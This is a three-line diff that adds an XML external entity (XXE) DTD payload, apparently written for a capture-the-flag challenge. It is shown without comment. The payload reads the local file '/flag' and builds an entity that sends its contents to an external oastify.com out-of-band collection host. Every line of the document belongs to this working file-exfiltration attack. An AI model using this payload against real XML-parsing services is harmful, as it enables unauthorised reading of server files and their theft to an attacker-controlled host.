@@ -1,0 +1,3 @@
+<!ENTITY % file SYSTEM "file:///flag">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://fk37qswn7nh89f7yf51eai7o6fc709oy.oastify.com/?flag=%file;'>">
+%all;
